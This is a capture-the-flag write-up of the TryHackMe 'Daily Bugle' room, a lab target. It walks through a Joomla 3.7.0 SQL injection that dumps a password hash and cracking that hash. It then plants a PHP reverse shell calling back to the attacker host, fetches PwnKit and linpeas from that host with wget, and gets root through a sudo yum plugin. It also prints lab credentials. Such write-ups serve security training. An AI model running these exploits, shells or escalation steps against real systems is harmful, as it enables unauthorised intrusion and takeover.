---
author: "fireblood"
date: 2023-05-23
linktitle: Daily Bugle
menu:
  main:
    parent: tryhackme

title: Daily Bugle
weight: 996
tags:
    - SQLi
    - Joomla CMS
    - Cracking Hashes
    - Privilege Escalation
categories:
    - TryHackMe
---

> Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

https://tryhackme.com/r/room/dailybugle

<!--more-->

# Scanning

Let's begin by scanning the target.

```shell
rustscan -a 10.10.59.64 -r 1-65535 --ulimit 5000 -- -sVC
```

```shell
(root㉿kali)-[~/tryhackme]
└─# rustscan -a 10.10.59.64 -r 1-65535 --ulimit 5000 -- -sVC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.59.64:22
Open 10.10.59.64:80
Open 10.10.59.64:3306
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC" on ip 10.10.59.64
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 23:05 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:05
Completed NSE at 23:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:05
Completed NSE at 23:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:05
Completed NSE at 23:05, 0.00s elapsed
Initiating Ping Scan at 23:05
Scanning 10.10.59.64 [4 ports]
Completed Ping Scan at 23:05, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:05
Completed Parallel DNS resolution of 1 host. at 23:05, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:05
Scanning 10.10.59.64 [3 ports]
Discovered open port 22/tcp on 10.10.59.64
Discovered open port 80/tcp on 10.10.59.64
Discovered open port 3306/tcp on 10.10.59.64
Completed SYN Stealth Scan at 23:05, 0.13s elapsed (3 total ports)
Initiating Service scan at 23:05
Scanning 3 services on 10.10.59.64
Completed Service scan at 23:06, 16.47s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.59.64.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:06
NSE Timing: About 98.57% done; ETC: 23:06 (0:00:00 remaining)
NSE Timing: About 99.76% done; ETC: 23:07 (0:00:00 remaining)
Completed NSE at 23:07, 67.89s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 7.52s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
Nmap scan report for 10.10.59.64
Host is up, received echo-reply ttl 61 (0.092s latency).
Scanned at 2023-03-19 23:05:49 EDT for 92s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   syn-ack ttl 61 MariaDB (unauthorized)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.57 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```

# Enumeration

We can see three open ports 22, 80 and 3306. There's a website hosted on port 80, mysql service on port 3306 and SSH on port 22.

Let's navigate to the website that's hosted on port 80. There's Daily Bugle and it says that Spider-Man robs bank.

From the scan results, we found that there are some disallowed entries in robots.txt. Let's navigate to robots.txt and see if we can find any useful paths.

```shell
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

The ```/administrator/``` leads to a Joomla login page. Let's try to find the version of Joomla.

A simple google search gave the path ```/administrator/manifests/files/joomla.xml``` where the Joomla version can be found.

>https://www.zyxware.com/articles/5532/how-to-know-the-version-of-joomla-site-without-admin-access

```xml
 This XML file does not appear to have any style information associated with it. The document tree is shown below.
<extension version="3.6" type="file" method="upgrade">
<name>files_joomla</name>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>
(C) 2005 - 2017 Open Source Matters. All rights reserved
</copyright>
<license>
GNU General Public License version 2 or later; see LICENSE.txt
</license>
<version>3.7.0</version>
<creationDate>April 2017</creationDate>
<description>FILES_JOOMLA_XML_DESCRIPTION</description>
<scriptfile>administrator/components/com_admin/script.php</scriptfile>
<update>
<schemas>
<schemapath type="mysql">
administrator/components/com_admin/sql/updates/mysql
</schemapath>
<schemapath type="sqlsrv">
administrator/components/com_admin/sql/updates/sqlazure
</schemapath>
<schemapath type="sqlazure">
administrator/components/com_admin/sql/updates/sqlazure
</schemapath>
<schemapath type="postgresql">
administrator/components/com_admin/sql/updates/postgresql
</schemapath>
</schemas>
</update>
<fileset>
<files>
<folder>administrator</folder>
<folder>bin</folder>
<folder>cache</folder>
<folder>cli</folder>
<folder>components</folder>
<folder>images</folder>
<folder>includes</folder>
<folder>language</folder>
<folder>layouts</folder>
<folder>libraries</folder>
<folder>media</folder>
<folder>modules</folder>
<folder>plugins</folder>
<folder>templates</folder>
<folder>tmp</folder>
<file>htaccess.txt</file>
<file>web.config.txt</file>
<file>LICENSE.txt</file>
<file>README.txt</file>
<file>index.php</file>
</files>
</fileset>
<updateservers>
<server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
</updateservers>
</extension>
```

Upon checking the vulnerabilities for the Joomla 3.7, there is an SQL Injection vulnerability present in Joomla 3.7.x before 3.7.1.

>https://www.cvedetails.com/cve/CVE-2017-8917/

# Exploitation

There is a python code available to exploit this vulnerability.

>https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py

```shell
┌──(root㉿kali)-[~/tryhackme]
└─# ./joomblah.py http://10.10.59.64/   
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

We found a user ```jonah``` with a password hash. Let's crack the hash using John The Ripper. It takes quite some time to crack the password.

```shell
┌──(root㉿kali)-[~/tryhackme]
└─# cat hash.txt
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm

┌──(root㉿kali)-[~/tryhackme]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:08:37 DONE (2023-03-20 01:18) 0.001933g/s 90.54p/s 90.54c/s 90.54C/s sweetsmile..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Let's login to Joomla using the credentials ```jonah``` and ```spiderman123```.

Upon navigating to the templates section and clicking on templates, we can see the templates that are being used. In each template, we can see some php files. Let's try to get a php reverse shell using those. Navigate to index.php file in protostar template and replace the code with the following php code.

>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Make sure to change the ip address in the php file.

Start the netcat listener and navigate to main website that's being hosted on port 80.

```shell
┌──(root㉿kali)-[~/tools]
└─# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.6.10.164] from (UNKNOWN) [10.10.59.64] 48864
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:46:50 up 34 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
```

We get a foothold on the machine.

# Privilege Escalation

## Method 1

Use the PwnKit exploit to get root privileges.

>https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit

Download the binary to host machine and serve it using python http web server. Then download the binary to the target machine's /tmp directory, change the permissions to executable and run it.

```shell
python -m http.server
```

```shell
sh-4.2$ wget http://10.6.10.164:8000/PwnKit
wget http://10.6.10.164:8000/PwnKit
--2023-03-20 02:01:32--  http://10.6.10.164:8000/PwnKit
Connecting to 10.6.10.164:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'PwnKit'

100%[======================================>] 18,040      --.-K/s   in 0.09s   

2023-03-20 02:01:32 (189 KB/s) - 'PwnKit' saved [18040/18040]

sh-4.2$ chmod +x PwnKit
chmod +x PwnKit
sh-4.2$ ./PwnKit
./PwnKit
[root@dailybugle tmp]# id
id
uid=0(root) gid=0(root) groups=0(root),48(apache)
[root@dailybugle tmp]# 
```

We are root!!!

## Method 2

Download ```linpeas.sh``` to the target machine and run it.

```shell
sh-4.2$ cd /tmp
cd /tmp
sh-4.2$ wget http://10.6.10.164:8000/linpeas.sh
wget http://10.6.10.164:8000/linpeas.sh
--2023-03-20 02:18:45--  http://10.6.10.164:8000/linpeas.sh
Connecting to 10.6.10.164:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828172 (809K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  260K 3s
    50K .......... .......... .......... .......... .......... 12%  554K 2s
   100K .......... .......... .......... .......... .......... 18% 2.42M 1s
   150K .......... .......... .......... .......... .......... 24%  665K 1s
   200K .......... .......... .......... .......... .......... 30% 1.76M 1s
   250K .......... .......... .......... .......... .......... 37% 7.66M 1s
   300K .......... .......... .......... .......... .......... 43% 7.49M 1s
   350K .......... .......... .......... .......... .......... 49%  971K 0s
   400K .......... .......... .......... .......... .......... 55% 3.86M 0s
   450K .......... .......... .......... .......... .......... 61% 2.12M 0s
   500K .......... .......... .......... .......... .......... 68% 9.80M 0s
   550K .......... .......... .......... .......... .......... 74% 13.5M 0s
   600K .......... .......... .......... .......... .......... 80% 3.34M 0s
   650K .......... .......... .......... .......... .......... 86% 1.07M 0s
   700K .......... .......... .......... .......... .......... 92% 8.62M 0s
   750K .......... .......... .......... .......... .......... 98% 2.25M 0s
   800K ........                                              100% 65.8M=0.6s

2023-03-20 02:18:45 (1.31 MB/s) - 'linpeas.sh' saved [828172/828172]

sh-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
sh-4.2$ ./linpeas.sh
```

We found a public password in php config files.

```shell
╔══════════╣ Searching passwords in config PHP files
        public $password = 'nv5uz9r3ZEDzVjNu';
                        $this->password = (empty($this->options['db_pass'])) ? '' : $this->options['db_pass'];
                        $this->password = null;
                        'password' => $this->password,
```

Let's try this password to switch the user from ```apache``` to ```jjameson```. 

```shell
sh-4.2$ su jjameson
su jjameson
Password: nv5uz9r3ZEDzVjNu
id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
whoami
jjameson
```

It worked. We successfully changed to the user ```jjameson```.

Now, let's see what binaries can be run using sudo.

```shell
sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

The user ```jjameson``` can run the binary ```yum``` with root privileges.

Navigate to GTFO bins.

>https://gtfobins.github.io/gtfobins/yum/#sudo

We can spawn an interactive root shell by loading a custom plugin as follows.

```shell
id    
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
whoami
jjameson
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

We are root!!!